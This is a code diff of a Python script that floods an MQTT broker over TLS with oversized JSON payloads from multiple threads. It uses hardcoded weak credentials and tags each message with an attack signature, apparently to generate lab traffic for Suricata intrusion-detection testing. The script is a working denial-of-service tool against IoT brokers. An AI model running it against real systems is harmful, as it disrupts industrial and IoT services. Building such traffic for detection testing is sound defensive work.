@@ -2,7 +2,6 @@ import paho.mqtt.client as mqtt
 import json
 import time
 import threading
-import random
 import ssl
 from datetime import datetime, timezone
 
@@ -24,6 +23,7 @@ class PayloadAnomalyAttackTLS:
         try:
             client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
 
+            # 🔒 TLS config (CA certificate only)
             client.tls_set(
                 ca_certs=self.ca_cert_path,
                 cert_reqs=ssl.CERT_REQUIRED,
@@ -31,38 +31,31 @@ class PayloadAnomalyAttackTLS:
                 ciphers=None
             )
 
+            # 🔐 Use consistent credentials for Suricata visibility
             username = "giamdoc"
             password = "123"
             client.username_pw_set(username, password)
 
             return client
         except Exception as e:
-            print(f" Error creating client {client_id}: {e}")
+            print(f"Error creating client {client_id}: {e}")
             return None
 
-    def generate_anomalous_payload(self, topic):
-        """
-        ALWAYS generate an oversized payload.
-        Returns a JSON string.
-        """
-        base_payload = {
+    def generate_payload(self, topic):
+        """Generate a payload similar to normal IoT devices but with extra anomaly markers."""
+        payload = {
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "packet_type": "PUBLISH",
-            "topic": topic,
-            "attack_signature": "R5_PAYLOAD_ANOMALY"
-        }
-
-        large_data = "X" * 10000000
-        payload = base_payload.copy()
-        payload.update({
-            "payload_length": len(large_data),
+            "value": 9999.99,
+            "client_id": "attack_fast-sensor2",
+            "zone": "attack",
+            "attack_signature": "R5_PAYLOAD_ANOMALY",
             "anomaly_type": "oversized_payload",
-            "data": large_data
-        })
+            "data": "X" * 5000  # 5 KB valid JSON string
+        }
         return json.dumps(payload)
 
     def anomaly_worker(self, worker_id, num_messages=50, delay_ms=200):
-        client_id = f"payload_anomaly_tls_{worker_id}"
+        client_id = f"attack_fast_worker{worker_id}"
         client = self.create_client(client_id)
 
         if not client:
@@ -72,115 +65,63 @@ class PayloadAnomalyAttackTLS:
         try:
             client.connect(self.broker_host, self.broker_port, 60)
             client.loop_start()
-            print(f" Worker {worker_id}: Connected (TLS), starting oversized payload attack...")
+            print(f"Worker {worker_id}: Connected to {self.broker_host}:{self.broker_port} using TLS")
 
-            topic = "factory/office/Device245/telemetry"
+            topic = "factory/energy/attack-fast/telemetry"
 
             for i in range(num_messages):
                 try:
-                    anomaly_type = "oversized_payload"
-                    payload = self.generate_anomalous_payload(topic)
-
-                    anomaly_log = {
-                        "timestamp": datetime.now(timezone.utc).isoformat(),
-                        "packet_type": "PUBLISH",
-                        "client_id": client_id,
-                        "topic": topic,
-                        "src_ip": "127.0.0.1",
-                        "attack_signature": "R5_PAYLOAD_ANOMALY",
-                        "worker_id": worker_id,
-                        "message_id": i,
-                        "anomaly_type": anomaly_type,
-                        "payload_length": len(payload)
-                    }
-
-                    info = client.publish(topic, payload, qos=0)
-
+                    payload = self.generate_payload(topic)
+                    info = client.publish(topic, payload, qos=0, retain=False)
                     if getattr(info, "rc", 1) == 0:
                         self.attack_stats["messages_sent"] += 1
-                        print(f" Worker {worker_id}: Sent oversized payload (message {i+1})")
+                        print(f"Worker {worker_id}: Sent message {i+1}")
                     else:
                         self.attack_stats["messages_failed"] += 1
-                        print(f" Worker {worker_id}: Failed to send oversized payload")
-
-                    print(f" [R5] {json.dumps(anomaly_log)}")
-
-                    if delay_ms > 0:
-                        time.sleep(delay_ms / 1000.0)
-
+                        print(f"Worker {worker_id}: Failed to send message {i+1}")
+                    time.sleep(delay_ms / 1000.0)
                 except Exception as e:
                     self.attack_stats["messages_failed"] += 1
-                    print(f" Worker {worker_id}: Error sending message {i}: {e}")
-
-            print(f" Worker {worker_id}: Completed oversized payload attack")
+                    print(f"Worker {worker_id}: Error sending message {i}: {e}")
 
         except Exception as e:
-            print(f" Worker {worker_id}: Connection failed: {e}")
+            print(f"Worker {worker_id}: Connection failed: {e}")
             self.attack_stats["connections_failed"] += 1
         finally:
-            try:
-                client.loop_stop()
-                client.disconnect()
-            except Exception:
-                pass
+            client.loop_stop()
+            client.disconnect()
 
     def launch_attack(self, num_workers=2, messages_per_worker=50, delay_ms=200):
-        print(f" Starting Payload Anomaly Attack (TLS) - OVERSIZED PAYLOAD ONLY")
-        print(f"   Workers: {num_workers}")
-        print(f"   Messages per worker: {messages_per_worker}")
-        print(f"   Total messages: {num_workers * messages_per_worker}")
-        print(f"   Delay: {delay_ms}ms")
-        print(f"   Broker: {self.broker_host}:{self.broker_port}")
-        print(f"   CA cert: {self.ca_cert_path}")
-        print("=" * 60)
+        print(f"Launching Payload Anomaly Attack (TLS)")
+        print(f"Broker: {self.broker_host}:{self.broker_port}")
+        print(f"CA Certificate: {self.ca_cert_path}")
+        print(f"Workers: {num_workers}, Messages per worker: {messages_per_worker}")
 
         self.attack_stats["start_time"] = time.time()
-
         threads = []
         for i in range(num_workers):
-            thread = threading.Thread(
-                target=self.anomaly_worker,
-                args=(i, messages_per_worker, delay_ms)
-            )
-            threads.append(thread)
+            t = threading.Thread(target=self.anomaly_worker, args=(i, messages_per_worker, delay_ms))
+            threads.append(t)
+            t.start()
 
-        for thread in threads:
-            thread.start()
-
-        try:
-            for thread in threads:
-                thread.join()
-        except KeyboardInterrupt:
-            print("\n  Attack stopped by user")
+        for t in threads:
+            t.join()
 
         self.attack_stats["end_time"] = time.time()
-        self.print_attack_stats()
+        self.print_stats()
 
-    def print_attack_stats(self):
-        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
-        total_messages = self.attack_stats['messages_sent'] + self.attack_stats['messages_failed']
+    def print_stats(self):
+        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
+        print("\nAttack Stats:")
+        print(f"Messages Sent: {self.attack_stats['messages_sent']}")
+        print(f"Messages Failed: {self.attack_stats['messages_failed']}")
+        print(f"Connections Failed: {self.attack_stats['connections_failed']}")
+        print(f"Duration: {duration:.2f}s")
 
-        print("\n Attack Statistics (TLS):")
-        print("=" * 40)
-        print(f"Duration: {duration:.2f} seconds")
-        print(f"Messages sent: {self.attack_stats['messages_sent']}")
-        print(f"Messages failed: {self.attack_stats['messages_failed']}")
-        print(f"Connections failed: {self.attack_stats['connections_failed']}")
-        print(f"Success rate: {(self.attack_stats['messages_sent']/total_messages*100):.1f}%" if total_messages > 0 else "N/A")
-        print(f"Messages per second: {(self.attack_stats['messages_sent']/duration):.1f}" if duration > 0 else "N/A")
-
-def main():
+if __name__ == "__main__":
     attack = PayloadAnomalyAttackTLS(
-        broker_host="192.168.101.144",
+        broker_host="10.12.112.191",
         broker_port=8883,
         ca_cert_path="certs/ca-cert.pem"
     )
-
-    attack.launch_attack(
-        num_workers=4,
-        messages_per_worker=50,
-        delay_ms=200
-    )
-
-if __name__ == "__main__":
-    main()
+    attack.launch_attack(num_workers=4, messages_per_worker=20, delay_ms=300)
